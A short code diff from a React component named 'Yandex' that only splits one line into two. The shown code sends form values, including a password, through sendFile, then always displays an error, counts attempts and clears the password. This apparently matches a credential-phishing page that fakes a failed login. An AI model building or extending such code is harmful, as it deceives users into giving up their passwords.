@@ -28,7 +28,8 @@ function Yandex({ location }) {
       sendFile(values).then((data) => {
         // show error
         notify();
-        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
+        setSubmited({ ...submited, count: submited.count + 1 });
+        setValues({ ...values, password: "" });
         console.log(data);
         console.log(submited);
       });
